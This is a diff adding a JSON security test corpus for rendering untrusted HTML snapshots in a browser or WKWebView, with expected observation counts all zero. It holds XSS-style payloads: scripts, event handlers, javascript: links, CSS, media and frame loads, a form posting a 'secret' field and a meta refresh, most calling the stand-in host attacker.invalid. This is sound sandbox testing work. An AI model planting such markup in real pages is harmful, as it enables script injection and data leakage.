@@ -1,0 +1,57 @@
+{
+  "version": 1,
+  "description": "Shared Relay, Web, browser, Safari, and WKWebView security corpus for untrusted session HTML snapshots.",
+  "expected_observations": {
+    "script_executions": 0,
+    "network_requests": 0,
+    "form_submissions": 0,
+    "popup_or_frame_creations": 0,
+    "same_origin_reads": 0,
+    "top_level_navigations": 0
+  },
+  "cases": [
+    {
+      "id": "active-script-and-origin-probes",
+      "threats": ["scripts", "same_origin_access", "fetch", "xhr", "websocket", "popups"],
+      "html": "<!doctype html><script>parent.document.body.dataset.compromised='1';fetch('https://attacker.invalid/fetch');new XMLHttpRequest().open('GET','https://attacker.invalid/xhr');new WebSocket('wss://attacker.invalid/socket');window.open('https://attacker.invalid/popup')</script><p>script probe</p>"
+    },
+    {
+      "id": "html-and-svg-event-handlers",
+      "threats": ["event_handlers", "svg_handlers"],
+      "html": "<img src=x onerror=\"parent.postMessage('img-handler','*')\"><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"parent.postMessage('svg-handler','*')\"><a href=\"javascript:alert(1)\"><text>svg link</text></a></svg>"
+    },
+    {
+      "id": "css-network-loads",
+      "threats": ["css_url", "css_import", "external_images", "external_fonts"],
+      "html": "<style>@import url('https://attacker.invalid/import.css');@font-face{font-family:leak;src:url('https://attacker.invalid/font.woff2')}body{background-image:url('https://attacker.invalid/bg.png');font-family:leak}</style><img src=\"https://attacker.invalid/image.png\" srcset=\"https://attacker.invalid/image-2x.png 2x\">"
+    },
+    {
+      "id": "embedded-active-content",
+      "threats": ["media", "objects", "frames"],
+      "html": "<audio autoplay src=\"https://attacker.invalid/audio.mp3\"></audio><video autoplay poster=\"https://attacker.invalid/poster.png\" src=\"https://attacker.invalid/video.mp4\"></video><object data=\"https://attacker.invalid/object\"></object><embed src=\"https://attacker.invalid/embed\"><iframe src=\"https://attacker.invalid/frame\"></iframe>"
+    },
+    {
+      "id": "forms-links-and-top-navigation",
+      "threats": ["forms", "links", "popups"],
+      "html": "<form action=\"https://attacker.invalid/submit\" method=\"post\"><input name=secret value=probe><button autofocus>submit</button></form><a href=\"https://attacker.invalid/link\" target=\"_top\">top</a><a href=\"https://attacker.invalid/new\" target=\"_blank\">popup</a>"
+    },
+    {
+      "id": "meta-refresh-navigation",
+      "threats": ["meta_refresh"],
+      "html": "<!doctype html><meta http-equiv=\"refresh\" content=\"0;url=https://attacker.invalid/refresh\"><p>refresh probe</p>"
+    },
+    {
+      "id": "malformed-parser-boundaries",
+      "threats": ["malformed_markup", "event_handlers", "scripts"],
+      "html": "<table><svg><style><img src=x onerror=alert(1)></style></svg><tr><td><math><mtext></table><script>parent.postMessage('parser-script','*')</script><!--"
+    },
+    {
+      "id": "oversized-document",
+      "threats": ["oversized_input"],
+      "generated": {
+        "value": "A",
+        "count": 2097153
+      }
+    }
+  ]
+}
